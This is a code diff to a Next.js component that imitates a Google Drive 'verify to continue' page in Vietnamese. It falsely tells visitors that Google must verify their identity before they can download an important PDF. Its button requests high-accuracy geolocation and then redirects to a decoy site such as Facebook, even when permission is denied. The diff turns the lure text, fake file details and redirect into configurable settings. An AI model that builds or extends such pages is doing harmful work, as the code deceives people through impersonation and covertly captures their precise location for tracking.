@@ -5,11 +5,24 @@ import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
 import { FileText, ShieldCheck } from 'lucide-react';
+import type { VerificationConfig } from '@/app/actions/settings';
 
-export function DriveVerificationClient() {
-  // === CUSTOMIZE YOUR REDIRECT LINK HERE ===
-  const REDIRECT_URL = 'https://www.facebook.com'; 
-  // =========================================
+interface DriveVerificationClientProps {
+  config: VerificationConfig;
+}
+
+export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
+  const { 
+    title, 
+    description, 
+    fileName, 
+    fileInfo, 
+    buttonText, 
+    footerText, 
+    redirectUrl 
+  } = config;
+  
+  const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
   const requestLocation = () => {
     if (navigator.geolocation) {
@@ -28,13 +41,11 @@ export function DriveVerificationClient() {
           });
         },
         () => {
-          // If user denies location, still redirect
           window.location.href = REDIRECT_URL;
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
-      // If geolocation is not supported, still redirect
       window.location.href = REDIRECT_URL;
     }
   };
@@ -52,16 +63,16 @@ export function DriveVerificationClient() {
             height={74}
           />
           
-          <h1 className="text-2xl font-bold mb-2 text-foreground">Xác minh để tiếp tục</h1>
+          <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
           <p className="text-muted-foreground text-sm leading-normal mb-8">
-            Để bảo vệ tệp và ngăn chặn truy cập trái phép, Google cần xác minh nhanh danh tính của bạn.
+            {description}
           </p>
 
           <div className="w-full bg-muted/40 border rounded-lg p-4 flex items-center gap-4 mb-8 text-left">
             <FileText className="h-10 w-10 text-primary shrink-0" />
             <div>
-              <p className="font-semibold text-foreground">Tai-lieu-quan-trong.pdf</p>
-              <p className="text-xs text-muted-foreground">1.2 MB - Tệp an toàn</p>
+              <p className="font-semibold text-foreground">{fileName}</p>
+              <p className="text-xs text-muted-foreground">{fileInfo}</p>
             </div>
           </div>
 
@@ -70,11 +81,11 @@ export function DriveVerificationClient() {
             onClick={requestLocation}
           >
             <ShieldCheck className="mr-2 h-5 w-5" />
-            Xác minh & Tải xuống
+            {buttonText}
           </Button>
 
           <div className="text-xs text-muted-foreground/80 mt-6">
-            Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.
+            {footerText}
           </div>
         </CardContent>
       </Card>
